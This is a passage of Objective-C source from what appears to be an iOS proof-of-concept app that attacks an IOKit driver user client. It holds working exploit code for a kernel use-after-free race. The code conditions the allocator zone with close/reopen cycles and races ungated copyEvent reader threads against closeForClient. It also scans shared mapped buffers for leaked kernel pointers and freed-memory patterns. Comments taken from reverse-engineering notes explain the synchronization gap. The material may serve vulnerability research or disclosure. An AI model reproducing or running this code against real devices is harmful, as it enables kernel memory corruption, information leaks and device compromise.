            size_t hashLen = MIN((size_t)64, snapLen);
            for (size_t i = 0; i < hashLen; i++) {
                preHash ^= ((uint64_t)p[i]) << ((i % 8) * 8);
            }
        }
        [self appendLog:[NSString stringWithFormat:@"Pre-stress baseline: entropy=%.4f hash=0x%016llx", preEntropy, preHash]];

        // Map memory on auxiliary connections for cross-client observation.
        // If the ClientObject reference at conn[0] becomes invalidated during
        // copyEvent, the provider may write event data to a different client's buffer.
        // Monitoring these buffers for unexpected updates is a cross-client boundary signal.
        mach_vm_address_t auxMappedAddrs[kDesiredConnections];
        mach_vm_size_t auxMappedSizes[kDesiredConnections];
        memset(auxMappedAddrs, 0, sizeof(auxMappedAddrs));
        memset(auxMappedSizes, 0, sizeof(auxMappedSizes));
        for (int i = 1; i < connCount; i++) {
            mach_vm_address_t addr = 0;
            mach_vm_size_t sz = 0;
            kern_return_t mkr = sIOConnectMapMemory64(conns[i], kMemoryTypeEventBuffer,
                                                       mach_task_self(), &addr, &sz, 1);
            if (mkr == KERN_SUCCESS && addr != 0 && sz > 0) {
                auxMappedAddrs[i] = addr;
                auxMappedSizes[i] = sz;
            }
        }
        int auxMappedCount = 0;
        for (int i = 1; i < connCount; i++) {
            if (auxMappedAddrs[i] != 0) auxMappedCount++;
        }
        [self appendLog:[NSString stringWithFormat:@"Cross-client observation: mapped %d auxiliary connection buffers", auxMappedCount]];

        // ---- Sub-phase B: Lifecycle Desynchronization Stress ----
        BOOL canRunLifecycleStress = (connCount >= 2);
        if (canRunLifecycleStress) {
            [self runLifecycleDesyncStress:conns count:connCount mappedAddr:mappedAddr mappedSize:mappedSize
                             auxMappings:auxMappedAddrs auxMappedSizes:auxMappedSizes
                              raceService:providerService];

            // Post-stress: bring conn[0] to a known state for sub-phases C/D.
            //
            // Note: The stress workers already perform open/close cycles, so calling "open" again here
            // can legitimately return "already open"/exclusive access style errors. To avoid treating
            // a valid steady-state as an anomaly, do an explicit close->open transition.
            for (int i = 0; i < connCount; i++) {
                if (i == 0) {
                    uint64_t closeScalar = 0;
                    kern_return_t ckr = sIOConnectCallMethod(
                        conns[i], kSelectorClose,
                        &closeScalar, 1, NULL, 0,
                        NULL, NULL, NULL, NULL
                    );

                    uint64_t openScalar = 0;
                    const char *xml = kOpenPropertiesXML;
                    kern_return_t okr = sIOConnectCallMethod(
                        conns[i], kSelectorOpen,
                        &openScalar, 1,
                        xml, strlen(xml) + 1,
                        NULL, NULL, NULL, NULL
                    );

                    [self appendLog:[NSString stringWithFormat:
                        @"Post-stress sync conn[0]: close=0x%x (%s) open=0x%x (%s)",
                        ckr, mach_error_string(ckr), okr, mach_error_string(okr)]];
                }
            }

            // ---- Sub-phase C: Post-Stress Structural Analysis ----
            [self runPostStressStructuralAnalysis:primaryConn mappedAddr:mappedAddr mappedSize:mappedSize preSnapshot:preSnapshot];

            // ---- Sub-phase D: Post-Lifecycle Buffer Fingerprint ----
            [self runPostLifecycleFingerprint:primaryConn
                                   mappedAddr:mappedAddr
                                   mappedSize:mappedSize
                                   preEntropy:preEntropy
                                      preHash:preHash
                             primaryScanCount:self.proofPrimaryScanCount
                             primaryLeakCount:self.proofPrimaryLeakCount];

            // ---- Sub-phase E1: Read-After-Close Memory Boundary Probe ----
            [self runReadAfterCloseProbe:conns count:connCount
                              mappedAddr:mappedAddr mappedSize:mappedSize
                             raceService:providerService];

            // ---- Sub-phase E2: Uninitialized Buffer Probe ----
            [self runUninitBufferProbe:providerService];

            // ---- Sub-phase E3: Post-Close Remap Boundary Probe ----
            [self runRemapAfterFreeProbe:providerService];

        } else {
            [self appendLog:@"Skipping lifecycle desynchronization stress and post-stress sub-phases (single-connection mode)."];
        }

        // ---- Cleanup ----
        [self appendLog:@"\n--- Lifecycle Test Cleanup ---"];
        if (mappedAddr) {
            kern_return_t cleanupUnmapKr = KERN_FAILURE;
            if (sIOConnectUnmapMemory64) {
                cleanupUnmapKr = sIOConnectUnmapMemory64(primaryConn, kMemoryTypeEventBuffer, mach_task_self(), mappedAddr);
            }
            if (!sIOConnectUnmapMemory64 || cleanupUnmapKr != KERN_SUCCESS) {
                kern_return_t cleanupDeallocKr = vm_deallocate(mach_task_self(), (vm_address_t)mappedAddr, (vm_size_t)mappedSize);
                [self appendLog:[NSString stringWithFormat:@"Lifecycle cleanup primary unmap/dealloc: unmap=0x%x dealloc=0x%x",
                                 cleanupUnmapKr, cleanupDeallocKr]];
            }
        }
        for (int i = 1; i < connCount; i++) {
            if (auxMappedAddrs[i] != 0) {
                kern_return_t auxUnmapKr = KERN_FAILURE;
                if (sIOConnectUnmapMemory64) {
                    auxUnmapKr = sIOConnectUnmapMemory64(conns[i], kMemoryTypeEventBuffer, mach_task_self(), auxMappedAddrs[i]);
                }
                if (!sIOConnectUnmapMemory64 || auxUnmapKr != KERN_SUCCESS) {
                    kern_return_t auxDeallocKr = vm_deallocate(mach_task_self(), (vm_address_t)auxMappedAddrs[i], (vm_size_t)auxMappedSizes[i]);
                    [self appendLog:[NSString stringWithFormat:@"Lifecycle aux cleanup[%d]: unmap=0x%x dealloc=0x%x",
                                     i, auxUnmapKr, auxDeallocKr]];
                }
            }
        }
        for (int i = 0; i < connCount; i++) {
            uint64_t closeScalar = 0;
            sIOConnectCallMethod(conns[i], kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
            sIOServiceClose(conns[i]);
        }
        if (providerService != MACH_PORT_NULL) {
            sIOObjectRelease(providerService);
        }

        [self appendLog:@"\n========== LIFECYCLE BOUNDARY TEST COMPLETE =========="];

        dispatch_async(dispatch_get_main_queue(), ^{
            self.lifecycleButton.enabled = YES;
            self.triggerButton.enabled = YES;
            self.deepProbeButton.enabled = YES;
        });
    });
}

#pragma mark - Sub-phase A: Mapped Buffer Baseline Scan

- (void)runBaselineScan:(io_connect_t)connection
                mappedAddr:(mach_vm_address_t)mappedAddr
                mappedSize:(mach_vm_size_t)mappedSize {
    [self appendLog:@"\n====== Sub-phase A: Mapped Buffer Baseline Scan ======"];

    // Populate the buffer with a copyEvent call
    uint64_t scalarsIn[2] = { 0, 1 };
    uint8_t structOut[64];
    size_t structOutSize = sizeof(structOut);
    kern_return_t copyKr = sIOConnectCallMethod(
        connection, kSelectorCopyEvent,
        scalarsIn, 2, NULL, 0,
        NULL, NULL, structOut, &structOutSize
    );
    [self appendLog:[NSString stringWithFormat:@"Baseline copyEvent: 0x%x (%s)", copyKr, mach_error_string(copyKr)]];

    const uint8_t *base = (const uint8_t *)(uintptr_t)mappedAddr;
    size_t totalSize = MIN((size_t)mappedSize, (size_t)kMappedProbeMaxBytes);

    // Buffer format (confirmed via IDA):
    //   [0..3]   uint32_t payloadLen
    //   [4..]    payloadLen bytes of event payload
    uint32_t eventSize = 0;
    if (totalSize >= 4) {
        memcpy(&eventSize, base, sizeof(eventSize));
    }
    size_t eventRegionBytes = totalSize;
    if (totalSize >= 4) {
        uint64_t needed = 4ull + (uint64_t)eventSize;
        eventRegionBytes = (needed <= totalSize) ? (size_t)needed : totalSize;
    }

    [self appendLog:[NSString stringWithFormat:@"Mapped region: %zu bytes, eventSize=%u (0x%x)",
                     totalSize, eventSize, eventSize]];

    // Scan the full mapped region in 8-byte aligned steps for kernel address patterns
    uint32_t kernPtrCount = 0;
    uint32_t kernPtrInEvent = 0;
    uint32_t kernPtrOutside = 0;

    for (size_t off = 0; off + 8 <= totalSize; off += 8) {
        uint64_t val = 0;
        memcpy(&val, base + off, sizeof(val));

        // Check for kernel text/data addresses (arm64 kernelcache)
        uint32_t hi32 = (uint32_t)(val >> 32);
        BOOL isKernPtr = (hi32 == 0xFFFFFE00)
                      || ((val >> 36) == 0xFFFFFE0)
                      || (hi32 == 0xFFFFFF80);

        if (isKernPtr && val != 0) {
            kernPtrCount++;
            if (off < eventRegionBytes) {
                kernPtrInEvent++;
            } else {
                kernPtrOutside++;
            }
            if (kernPtrCount <= 10) {
                [self appendLog:[NSString stringWithFormat:
                    @"  Kernel address pattern at offset +0x%zx: 0x%016llx (%s event data)",
                    off, val, (off < eventRegionBytes) ? "inside" : "outside"]];
            }
        }
    }

    if (kernPtrCount > 10) {
        [self appendLog:[NSString stringWithFormat:@"  ... and %u more kernel address patterns", kernPtrCount - 10]];
    }

    // Compute entropy of region beyond eventSize
    size_t trailingStart = eventRegionBytes;
    size_t trailingLen = (trailingStart < totalSize) ? (totalSize - trailingStart) : 0;
    double trailingEntropy = 0.0;
    if (trailingLen > 0) {
        trailingEntropy = [self shannonEntropyForBytes:base + trailingStart length:trailingLen];
    }

    [self appendLog:[NSString stringWithFormat:
        @"Baseline scan: kernelAddrPatterns=%u (inEvent=%u, outside=%u) trailingEntropy=%.4f trailingBytes=%zu",
        kernPtrCount, kernPtrInEvent, kernPtrOutside, trailingEntropy, trailingLen]];

    if (kernPtrCount > 0) {
        [self appendLog:@"  SIGNAL: Kernel address patterns detected in mapped region at baseline."];
    } else {
        [self appendLog:@"  No kernel address patterns found at baseline."];
    }

    [self appendLog:@"====== Sub-phase A Complete ======"];
}

#pragma mark - Sub-phase B: Lifecycle Desynchronization Stress

- (void)runLifecycleDesyncStress:(io_connect_t *)connections
                           count:(int)connCount
                      mappedAddr:(mach_vm_address_t)mappedAddr
                      mappedSize:(mach_vm_size_t)mappedSize
                   auxMappings:(mach_vm_address_t *)auxMappedAddrs
                 auxMappedSizes:(mach_vm_size_t *)auxMappedSizes
                    raceService:(io_service_t)raceService {
    [self appendLog:@"\n====== Sub-phase B: Lifecycle Desynchronization Stress ======"];
    [self appendLog:[NSString stringWithFormat:@"  Using %d connections (separate per-userclient gates)", connCount]];

    // ---- Strategy (revised based on IDA + fault backtrace analysis) ----
    //
    // Key findings from kernel analysis (iPad xnu-10063):
    //   1. externalMethod dispatch (sub_FFFFFFF005AD171C):
    //        if (selector == 2) → DIRECT call (no command gate!)
    //        else               → IOCommandGate::runAction (gated)
    //      Selector 2 (copyEvent) bypasses the per-userclient command gate entirely.
    //
    //   2. All user clients share the PROVIDER's work loop (IOService::getWorkLoop
    //      at slot 111 is base impl — returns provider's WL). So sel 0/1 from ANY
    //      connection are serialized by the work loop. But sel 2 from ANY connection
    //      runs concurrently with gated actions.
    //
    //   3. Each user client has its own IOLock at +0x110. copyEvent (sel 2) takes
    //      this per-connection lock to check the opened flag and call provider->copyEvent.
    //      closeForClient (from sel 1) runs OUTSIDE this lock.
    //
    //   4. THE CROSS-CONNECTION RACE:
    //      - conn[0] sel 1 (gated): close handler → IOLock(conn[0]) → clear opened →
    //        IOUnlock(conn[0]) → closeForClient(provider, ...) ← modifies provider internals
    //      - conn[1] sel 2 (ungated): IOLock(conn[1]) → opened=true → provider->copyEvent()
    //        ← reads provider internals CONCURRENTLY
    //      Different IOLocks, different sync domains, same provider. The provider's
    //      closeForClient and copyEvent share internal data structures (client list at
    //      provider+504/+512) without mutual exclusion.
    //
    //   5. Fault evidence (both iPhone MTE + iPad zone free-fill):
    //      The fault occurs in AppleSPU's openForClient (sub_FFFFFFF005B6776C) calling
    //      safeMetaCast on a freed internal object. Backtrace shows the faulting thread
    //      was executing sel 0 (open) through the command gate, operating on provider
    //      state that was freed by a concurrent/preceding closeForClient.
    //
    // Test strategy:
    //   - conn[0]: lifecycle thread — rapid close/reopen (triggers closeForClient)
    //   - conn[1..N]: reader threads — copyEvent tight loop (reaches provider->copyEvent
    //     which races with closeForClient on provider's shared internal state)
    //   - conn[2..N]: churn threads — close/reopen for allocation pressure
    //   - Termination race thread: kept for completeness but secondary
    //   - NOTE: On affected builds, this test may trigger unexpected behavior.

    static const int kLifecycleCycles = 2000;
    static const int kMagazineDrainCycles = 32;
    static const NSTimeInterval kStressDuration = 25.0;

    __block atomic_int stopFlag = 0;
    __block atomic_int anomalyCount = 0;
    __block atomic_int sizeAnomalyCount = 0;
    __block atomic_int migErrorCount = 0;
    __block atomic_int readerIterations = 0;
    __block atomic_int lifecycleIterations = 0;
    __block atomic_int churnIterations = 0;
    __block atomic_int lifecycleCloseErrors = 0;
    __block atomic_int lifecycleOpenErrors = 0;
    __block atomic_int churnCloseErrors = 0;
    __block atomic_int churnOpenErrors = 0;
    __block atomic_int crossClientHits = 0;    // Auxiliary buffer received unexpected event data
    __block atomic_int terminationRaceIters = 0;
    __block atomic_int terminationBothSucceeded = 0; // Both sel1 + IOServiceClose returned success
    __block atomic_int terminationMigErrors = 0;     // MIG-style errors observed in sel1 path
    __block atomic_int terminationSel1Errors = 0;    // sel1 returned non-success
    __block atomic_int terminationSvcCloseErrors = 0;// IOServiceClose returned non-success

    // Snapshot auxiliary buffers before stress to detect cross-client data misdirection.
    // If the ClientObject reference at conn[0] becomes invalidated during copyEvent,
    // the provider may write event data to a different client's mapped buffer instead.
    const int kMaxAux = 16;
    // Heap-allocate so the block can capture the pointer (C arrays can't be block-captured).
    uint8_t (*auxPreSnaps)[kCrossClientSampleBytes] =
        (uint8_t (*)[kCrossClientSampleBytes])calloc(kMaxAux, kCrossClientSampleBytes);
    if (!auxPreSnaps) {
        [self appendLog:@"  WARNING: auxPreSnaps allocation failed; cross-client monitor disabled for this run."];
    }
    size_t *auxSampleLens = (size_t *)calloc(kMaxAux, sizeof(size_t));
    if (!auxSampleLens) {
        [self appendLog:@"  WARNING: auxSampleLens allocation failed; cross-client monitor disabled for this run."];
    }
    __block atomic_int firstCrossClientConn = ATOMIC_VAR_INIT(-1);
    __block atomic_int firstCrossClientEventSize = ATOMIC_VAR_INIT(0);
    __block atomic_int firstCrossClientSampleSet = ATOMIC_VAR_INIT(0);
    __block atomic_int firstCrossClientPtrOffset = ATOMIC_VAR_INIT(-1);
    __block volatile uint64_t firstCrossClientPtr = 0;
    uint8_t *firstCrossClientSample = (uint8_t *)malloc(kCrossClientSampleBytes);
    if (firstCrossClientSample) {
        memset(firstCrossClientSample, 0, kCrossClientSampleBytes);
    }
    for (int i = 1; i < connCount && i < kMaxAux; i++) {
        if (!auxPreSnaps || !auxSampleLens) break;
        if (auxMappedAddrs[i] != 0) {
            auxSampleLens[i] = MIN((size_t)auxMappedSizes[i], kCrossClientSampleBytes);
            if (auxSampleLens[i] > 0) {
                memcpy(auxPreSnaps[i], (const void *)(uintptr_t)auxMappedAddrs[i], auxSampleLens[i]);
            }
        }
    }

    // ---- Phase 1: Allocation Conditioning (hypothesis-based) ----
    // Cycle close/reopen on ALL connections to exercise the magazine swap path
    // for the ClientObject type-isolated zone. Each cycle releases + allocates one
    // ClientObject (0x48 bytes).
    uint32_t drainCloseErrs = 0, drainOpenErrs = 0;
    [self appendLog:[NSString stringWithFormat:@"  Allocation conditioning: %d close/reopen cycles across %d connections (ClientObject zone)...",
                     kMagazineDrainCycles, connCount]];
    for (int i = 0; i < kMagazineDrainCycles; i++) {
        // Cycle all connections to maximize ClientObject churn in the zone
        for (int c = 0; c < connCount; c++) {
            uint64_t closeScalar = 0;
            kern_return_t ckr = sIOConnectCallMethod(connections[c], kSelectorClose,
                                 &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
            if (ckr != KERN_SUCCESS) drainCloseErrs++;
        }
        // Reopen in reverse order — allocations pull from potentially different magazine positions
        for (int c = connCount - 1; c >= 0; c--) {
            uint64_t openScalar = 0;
            const char *xml = kOpenPropertiesXML;
            kern_return_t okr = sIOConnectCallMethod(connections[c], kSelectorOpen,
                                 &openScalar, 1, xml, strlen(xml) + 1,
                                 NULL, NULL, NULL, NULL);
            if (okr != KERN_SUCCESS) drainOpenErrs++;
        }
    }
    [self appendLog:[NSString stringWithFormat:@"  Allocation conditioning complete (%d cycles x %d conns = %d ClientObject alloc/release pairs). closeErrors=%u openErrors=%u",
                     kMagazineDrainCycles, connCount, kMagazineDrainCycles * connCount, drainCloseErrs, drainOpenErrs]];

    // Capture mapped buffer state immediately before stress
    uint8_t preStressSnap[64];
    memset(preStressSnap, 0, sizeof(preStressSnap));
    size_t preStressLen = MIN((size_t)64, (size_t)mappedSize);
    memcpy(preStressSnap, (const void *)(uintptr_t)mappedAddr, preStressLen);

    dispatch_group_t group = dispatch_group_create();

    // ---- Reader threads — copyEvent on conn[1..readerEnd] (bypasses command gate) ----
    // CROSS-CONNECTION RACE: CopyEvent (sel 2) bypasses the command gate entirely
    // (IDA: sub_FFFFFFF005AD171C — if selector==2, direct call, no runAction).
    // The reader uses conn[1+] which stays permanently OPEN, so copyEvent always
    // passes the opened check and reaches provider->copyEvent(vtable+0x668).
    // Meanwhile conn[0]'s close (sel 1, gated) calls closeForClient on the SAME
    // provider OUTSIDE any lock. Different IOLocks (conn[0]+0x110 vs conn[K]+0x110),
    // same provider internals — this is the synchronization gap.
    //
    // We use multiple dedicated reader connections (never closed) to maximize the
    // chance that at least one is mid-provider->copyEvent when closeForClient fires.
    int readerEnd = (connCount > 4) ? (1 + (connCount - 1) / 2) : MIN(connCount, 2);
    int readerCount = readerEnd - 1; // conn[1..readerEnd-1]
    if (readerCount < 1) readerCount = 1;
    [self appendLog:[NSString stringWithFormat:@"  Reader connections: conn[1..%d] (%d readers), Churn: conn[%d..%d]",
                     readerEnd - 1, readerCount, readerEnd, connCount - 1]];

    for (int rIdx = 1; rIdx < readerEnd && rIdx < connCount; rIdx++) {
        io_connect_t readerConn = connections[rIdx];
        // Each reader's own mapped buffer (copyEvent writes to the calling client's buffer)
        mach_vm_address_t readerMapped = (rIdx < kMaxAux) ? auxMappedAddrs[rIdx] : 0;
        mach_vm_size_t readerMappedSz = (rIdx < kMaxAux) ? auxMappedSizes[rIdx] : 0;

        dispatch_queue_t readerQueue = dispatch_queue_create("com.testpoc.lifecycle.reader",
            dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

        dispatch_group_enter(group);
        dispatch_async(readerQueue, ^{
            uint32_t localReaderIter = 0;
            while (atomic_load(&stopFlag) == 0) {
                uint64_t scalarsIn[2] = { 0, 1 };
                uint8_t structOut[256];
                size_t structOutSize = sizeof(structOut);

                // copyEvent on conn[K] (K!=0): reaches provider->copyEvent under conn[K]'s
                // IOLock while conn[0]'s closeForClient modifies provider state with NO lock
                kern_return_t kr = sIOConnectCallMethod(
                    readerConn, kSelectorCopyEvent,
                    scalarsIn, 2, NULL, 0,
                    NULL, NULL, structOut, &structOutSize
                );

                localReaderIter++;

                // MIG errors indicate connection-level state inconsistency
                if ((kr & 0xFFFF0000) == 0x10000000) {
                    atomic_fetch_add(&migErrorCount, 1);
                }

                // Unexpected return codes (not in known set)
                if (kr != KERN_SUCCESS
                    && kr != (kern_return_t)0xE00002CD   // kIOReturnNotReady
                    && kr != (kern_return_t)0xE00002BC   // kIOReturnBadArgument
                    && kr != (kern_return_t)0xE00002BE   // kIOReturnNotOpen
                    && kr != (kern_return_t)0xE00002C2   // kIOReturnExclusiveAccess
                    && kr != (kern_return_t)0xE00002C5   // kIOReturnNotPermitted
                    && (kr & 0xFFFF0000) != 0x10000000) {
                    atomic_fetch_add(&anomalyCount, 1);
                    if (atomic_load(&anomalyCount) <= 10) {
                        [self appendLog:[NSString stringWithFormat:
                            @"  Reader[%d] anomaly: unexpected kr=0x%x (%s) at iter %u",
                            rIdx, kr, mach_error_string(kr), localReaderIter]];
                    }
                }

                // Size anomaly check on THIS reader's mapped buffer
                // (copyEvent writes event data to the calling client's shared mapping)
                if (readerMapped != 0 && readerMappedSz >= 8) {
                    uint32_t eventSize = 0;
                    memcpy(&eventSize, (const void *)(uintptr_t)readerMapped, sizeof(eventSize));
                    if ((uint64_t)eventSize + 4ull > (uint64_t)readerMappedSz) {
                        atomic_fetch_add(&sizeAnomalyCount, 1);
                        if (atomic_load(&sizeAnomalyCount) <= 5) {
                            [self appendLog:[NSString stringWithFormat:
                                @"  Size anomaly[%d]: payloadLen=%u (needs=%llu incl header) > mappedSize=%llu at iter %u",
                                rIdx, eventSize, (unsigned long long)((uint64_t)eventSize + 4ull),
                                (unsigned long long)readerMappedSz, localReaderIter]];
                        }
                    }
                }

                if ((localReaderIter & 0x3F) == 0) {
                    sched_yield();
                }
            }
            atomic_fetch_add(&readerIterations, (int)localReaderIter);
            dispatch_group_leave(group);
        });
    } // end reader loop over conn[1..readerEnd-1]

    // ---- Lifecycle thread — close/reopen cycles on conn[0] ----
    // conn[0] sel 1 (gated) → close handler → closeForClient(provider) OUTSIDE IOLock.
    // This modifies provider internals (client list at +504/+512) while readers on
    // conn[1..N] are concurrently calling provider->copyEvent under their own IOLocks.
    dispatch_queue_t lifecycleQueue = dispatch_queue_create("com.testpoc.lifecycle.closer",
        dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

    dispatch_group_enter(group);
    dispatch_async(lifecycleQueue, ^{
        uint32_t localCycles = 0;
        for (int cycle = 0; cycle < kLifecycleCycles && atomic_load(&stopFlag) == 0; cycle++) {
            // Close on conn[0] — releases ClientObject (0x48 bytes) back to its type-isolated zone
            uint64_t closeScalar = 0;
            kern_return_t ckr = sIOConnectCallMethod(connections[0], kSelectorClose,
                                 &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
            if (ckr != KERN_SUCCESS) {
                atomic_fetch_add(&lifecycleCloseErrors, 1);
            }

            // Re-open with valid XML — allocates a NEW ClientObject from the same zone.
            // If the zone's free list contains a slot from a different connection's
            // released ClientObject, this allocation may reuse that slot.
            uint64_t openScalar = 0;
            const char *xml = kOpenPropertiesXML;
            kern_return_t okr = sIOConnectCallMethod(connections[0], kSelectorOpen,
                                 &openScalar, 1,
                                 xml, strlen(xml) + 1,
                                 NULL, NULL, NULL, NULL);
            if (okr != KERN_SUCCESS) {
                atomic_fetch_add(&lifecycleOpenErrors, 1);
            }

            localCycles++;
            if (cycle % 400 == 0) {
                [self appendLog:[NSString stringWithFormat:@"  Lifecycle cycle %d/%d", cycle, kLifecycleCycles]];
            }
        }
        atomic_store(&lifecycleIterations, (int)localCycles);
        dispatch_group_leave(group);
    });

    // ---- Allocation churn threads — close/reopen on conn[readerEnd..N] ----
    // These close/reopen auxiliary connections to create allocation pressure on the provider's
    // internal client structures (provider+504/+512). Each close/reopen triggers
    // closeForClient/openForClient on the provider, racing with conn[1..readerEnd]'s
    // copyEvent on the provider's shared internal state.
    for (int churnIdx = readerEnd; churnIdx < connCount; churnIdx++) {
        io_connect_t churnConn = connections[churnIdx];

        dispatch_queue_t churnQueue = dispatch_queue_create("com.testpoc.lifecycle.churn",
            dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

        dispatch_group_enter(group);
        dispatch_async(churnQueue, ^{
            uint32_t localChurnIter = 0;
            uint32_t localCloseErrs = 0;
            uint32_t localOpenErrs = 0;
            while (atomic_load(&stopFlag) == 0) {
                // Close — releases this auxiliary connection's ClientObject
                uint64_t closeScalar = 0;
                kern_return_t ckr = sIOConnectCallMethod(churnConn, kSelectorClose,
                                                          &closeScalar, 1, NULL, 0,
                                                          NULL, NULL, NULL, NULL);
                if (ckr != KERN_SUCCESS) localCloseErrs++;

                // Open — re-establish the connection state after close.
                uint64_t openScalar = 0;
                const char *xml = kOpenPropertiesXML;
                kern_return_t okr = sIOConnectCallMethod(churnConn, kSelectorOpen,
                                                          &openScalar, 1,
                                                          xml, strlen(xml) + 1,
                                                          NULL, NULL, NULL, NULL);
                if (okr != KERN_SUCCESS) localOpenErrs++;

                localChurnIter++;

                if ((localChurnIter & 0x1F) == 0) {
                    sched_yield();
                }
            }
            atomic_fetch_add(&churnIterations, (int)localChurnIter);
            atomic_fetch_add(&churnCloseErrors, (int)localCloseErrs);
            atomic_fetch_add(&churnOpenErrors, (int)localOpenErrs);
            dispatch_group_leave(group);
        });
    }

    // Termination race runs as a separate dedicated phase after the main stress completes.
    // (Moved out of the concurrent group — see post-stress section below.)

    // ---- Primary buffer kernel pointer scanner — aggressive leak detection during race ----
    // Periodically scan the primary mapped buffer for kernel pointer patterns during the stress.
    // This catches transient leaks that appear in race windows but might not persist.
    __block atomic_int primaryScanCount = ATOMIC_VAR_INIT(0);
    __block atomic_int primaryLeakCount = ATOMIC_VAR_INIT(0);
    dispatch_queue_t scannerQueue = dispatch_queue_create("com.testpoc.lifecycle.scanner",
        dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

    dispatch_group_enter(group);
    dispatch_async(scannerQueue, ^{
        uint32_t scanIter = 0;
        size_t scanSize = MIN((size_t)mappedSize, (size_t)kMappedProbeMaxBytes);
        const uint8_t *scanBase = (const uint8_t *)(uintptr_t)mappedAddr;

        while (atomic_load(&stopFlag) == 0) {
            scanIter++;

            // Aggressive scan for kernel pointers in primary buffer
            NSArray<NSDictionary *> *leaks = [self scanForKernelPointers:scanBase
                                                                  length:scanSize
                                                              maxResults:50
                                                               connIndex:0];

            // Also scan for zone free-patterns (stale reference indicators)
            // Only do this every 10th iteration to reduce overhead
            int localFreePatterns = 0;
            if ((scanIter & 0x0F) == 0) {
                for (size_t off = 0; off + 8 <= scanSize; off += 8) {
                    uint64_t val = 0;
                    memcpy(&val, scanBase + off, sizeof(val));
                    if ([self isZoneFreePattern:val]) {
                        localFreePatterns++;
                        if (localFreePatterns == 1) {
                            [self appendLog:[NSString stringWithFormat:
                                @"  *** ZONE FREE-PATTERN in primary buffer (scan #%u) at +0x%zx: 0x%016llx ***",
                                scanIter, off, val]];
                        }
                    }
                }
            }

            if (leaks.count > 0) {
                int currentLeaks = atomic_fetch_add(&primaryLeakCount, (int)leaks.count);

                // Log first few leaks detected during race
                if (currentLeaks < 10) {
                    [self appendLog:[NSString stringWithFormat:
                        @"  *** PRIMARY BUFFER FINDING (race scan #%u): %lu kernel pointer patterns detected ***",
                        scanIter, (unsigned long)leaks.count]];

                    NSUInteger detailCount = MIN(3, leaks.count);
                    for (NSUInteger i = 0; i < detailCount; i++) {
                        NSDictionary *leak = leaks[i];
                        [self appendLog:[NSString stringWithFormat:
                            @"      [%lu] offset=0x%@ value=%@ inArray=%@",
                            (unsigned long)i,
                            leak[@"offset"],
                            leak[@"value"],
                            leak[@"inArray"]]];
                    }
                }

                // Store first leak if not already captured
                if (!self.proofKernelPointerLeak) {
                    NSDictionary *firstLeak = leaks[0];
                    uint64_t leakValue = 0;
                    sscanf([firstLeak[@"value"] UTF8String], "0x%llx", &leakValue);
                    self.proofKernelPointerLeak = YES;
                    self.proofKernelPointerValue = leakValue;
                    self.proofKernelPointerOffset = [firstLeak[@"offset"] intValue];
                    self.proofKernelPointerSourceConn = 0;
                    self.proofKernelPointerHex = [self hexPreview:(uint8_t *)&leakValue length:sizeof(leakValue)];
                }
            }

            atomic_fetch_add(&primaryScanCount, 1);

            // Scan every 2ms for high-frequency leak detection during race windows
            usleep(2000);
        }

        [self appendLog:[NSString stringWithFormat:
            @"  Primary buffer scanner: %u scans, %d total leaks detected",
            scanIter, atomic_load(&primaryLeakCount)]];
        dispatch_group_leave(group);
    });

    // ---- Cross-client monitor — watches auxiliary buffers for misdirected events ----
    // If the ClientObject reference at conn[0] becomes invalidated and another client's
    // object occupies the same memory, the provider may write event data to a different
    // client's mapped buffer. We detect this by checking auxiliary buffers for changes.
    __block atomic_int crossClientChecks = 0;
    if (connCount > 1) {
        dispatch_queue_t monitorQueue = dispatch_queue_create("com.testpoc.lifecycle.monitor",
            dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));

        dispatch_group_enter(group);
        dispatch_async(monitorQueue, ^{
            uint32_t localChecks = 0;
            while (atomic_load(&stopFlag) == 0) {
                for (int i = 1; i < connCount && i < kMaxAux; i++) {
                    size_t sampleLen = auxSampleLens ? auxSampleLens[i] : 0;
                    if (auxMappedAddrs[i] == 0 || sampleLen == 0) continue;
                    if (sampleLen > kCrossClientSampleBytes) {
                        sampleLen = kCrossClientSampleBytes;
                    }
                    uint8_t *current = (uint8_t *)malloc(sampleLen);
                    if (!current) {
                        continue;
                    }
                    memcpy(current, (const void *)(uintptr_t)auxMappedAddrs[i], sampleLen);
                    if (!auxPreSnaps) {
                        free(current);
                        continue;
                    }
                    if (memcmp(current, auxPreSnaps[i], sampleLen) != 0) {
                        int hitNum = atomic_fetch_add(&crossClientHits, 1);
                        uint32_t evtSz = 0;
                        memcpy(&evtSz, current, MIN(sizeof(evtSz), sampleLen));

                        // Aggressive kernel pointer scan on changed buffer
                        NSArray<NSDictionary *> *leaks = [self scanForKernelPointers:current
                                                                              length:sampleLen
                                                                          maxResults:20
                                                                           connIndex:i];

                        if (hitNum < 5 || leaks.count > 0) {
                            // Log the first few changes, or any that contain kernel pointers
                            [self appendLog:[NSString stringWithFormat:
                                @"  CROSS-CLIENT: aux conn[%d] buffer changed (eventSize=%u, kernPtrs=%lu) — possible data misdirection",
                                i, evtSz, (unsigned long)leaks.count]];

                            if (leaks.count > 0) {
                                [self appendLog:@"    *** KERNEL POINTER PATTERNS IN CROSS-CLIENT BUFFER:"];
                                NSUInteger detailCount = MIN(3, leaks.count);
                                for (NSUInteger j = 0; j < detailCount; j++) {
                                    NSDictionary *leak = leaks[j];
                                    [self appendLog:[NSString stringWithFormat:@"      [%lu] offset=0x%@ value=%@",
                                                     (unsigned long)j, leak[@"offset"], leak[@"value"]]];
                                }
                                if (leaks.count > 3) {
                                    [self appendLog:[NSString stringWithFormat:@"      ... and %lu more",
                                                     (unsigned long)(leaks.count - 3)]];
                                }
                            }
                        }

                        if (atomic_load(&firstCrossClientSampleSet) == 0) {
                            int expected = 0;
                            if (atomic_compare_exchange_strong(&firstCrossClientSampleSet, &expected, 1)) {
                                atomic_store(&firstCrossClientConn, i);
                                atomic_store(&firstCrossClientEventSize, (int)evtSz);
                                if (firstCrossClientSample) {
